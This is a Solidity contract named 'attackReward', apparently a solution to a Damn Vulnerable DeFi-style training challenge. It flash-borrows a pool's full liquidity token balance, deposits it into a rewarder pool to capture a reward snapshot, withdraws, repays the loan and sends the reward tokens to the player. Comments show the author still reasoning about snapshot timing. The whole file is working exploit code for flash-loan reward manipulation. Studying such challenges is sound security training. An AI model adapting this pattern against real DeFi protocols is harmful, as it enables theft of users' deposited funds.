// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
import "solady/src/utils/FixedPointMathLib.sol";
import "solady/src/utils/SafeTransferLib.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface ITheRewarderPool {
    function deposit(uint256 amount) external;
    function withdraw(uint256 amount) external;
}


interface IFlashLoanerPool {
    function flashLoan(uint256 amount) external;
}

contract attackReward {
ITheRewarderPool public pool;
IFlashLoanerPool public flashLoanPool;
IERC20 immutable lToken;
IERC20 immutable rToken;
address immutable player;

constructor(address _flashLoanPool, address _pool, address _liquidityToken, address _rewardToken){
    flashLoanPool = IFlashLoanerPool(_flashLoanPool);
    pool = ITheRewarderPool(_pool);
    player = msg.sender;
    lToken = IERC20(_liquidityToken);
    rToken = IERC20(_rewardToken);
}

function attack() external {
// call flash loan 
    flashLoanPool.flashLoan(lToken.balanceOf(address(flashLoanPool)));
}

function receiveFlashLoan(uint256 amount) external {
    lToken.approve(address(pool),amount);
    pool.deposit(amount);
    //manipulate lastRecordedSnapshotTimestamp to be 0?
    //call deposit
    //call withdraw
    pool.withdraw(amount);
    lToken.transfer(address(flashLoanPool),amount);
    rToken.transfer(player, rToken.balanceOf(address(this)));
}


// contract call flash loan -> flash loan transfer -> receive function in contract call deposit in rewarderpool -> deposit calls distribute rewards 
// -> calls record snapshot  (figure out how timing works) -> rewards distributed -> contract call withdrawl
// the key to this one may be understanding the snapshot functions...

}